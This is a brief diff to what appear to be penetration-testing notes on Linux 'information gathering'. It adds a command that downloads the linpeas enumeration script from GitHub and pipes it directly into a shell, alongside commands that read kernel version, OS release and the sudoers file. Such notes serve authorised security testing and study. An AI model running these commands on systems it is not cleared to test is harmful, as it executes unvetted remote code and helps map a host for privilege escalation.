@@ -1,6 +1,7 @@
 # information gathering
 
 ```bash
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 cat /proc/version
 cat /etc/issue
 cat /etc/sudoers
